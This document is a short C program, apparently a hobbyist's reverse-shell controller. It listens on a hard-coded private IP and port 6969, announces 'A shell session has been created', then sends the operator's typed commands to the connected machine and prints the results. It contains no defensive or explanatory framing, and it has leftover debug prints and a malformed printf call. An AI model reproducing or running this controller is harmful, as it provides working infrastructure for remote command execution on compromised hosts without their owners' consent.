#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<arpa/inet.h>

int main()
{
    printf("check1");
    int sock,client_sock;
    char chunk_buffer[1024];
    printf("check");
    char res[20000];
printf("check end");
    struct sockaddr_in server_addr,client_addr;
    int i=0;
    int optval=1;
    socklen_t client_len;
    sock=socket(AF_INET,SOCK_STREAM,0);
    printf("creating sockit.....");
    if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))<0)
    {
        printf("some error occured");
        return 1;
    }
    char *ip="192.168.43.163";
    server_addr.sin_family=AF_INET;
    server_addr.sin_addr.s_addr=inet_addr(ip);
    server_addr.sin_port=htons(6969);
    printf("binding");
    bind(sock,(struct sockaddr *) &server_addr,sizeof(server_addr));
    listen(sock,5);
    client_len=sizeof(client_addr);
    client_sock=accept(sock,(struct sockaddr *)&client_addr,&client_len);

    while(1)
    {

        bzero(&chunk_buffer,sizeof(chunk_buffer));
        bzero(&res,sizeof(res));
        printf("A shell session has been created >>>> ",inet_ntoa(client_addr.sin_addr));
        fgets(chunk_buffer,sizeof(chunk_buffer),stdin);
        strtok(chunk_buffer,"\n");
        write(client_sock,chunk_buffer,sizeof(chunk_buffer));
        if (strcmp("q",chunk_buffer)==0){break;}
        else{
            recv(client_sock,res,sizeof(res),MSG_WAITALL);
            printf("%s",res);
        }
    }
}
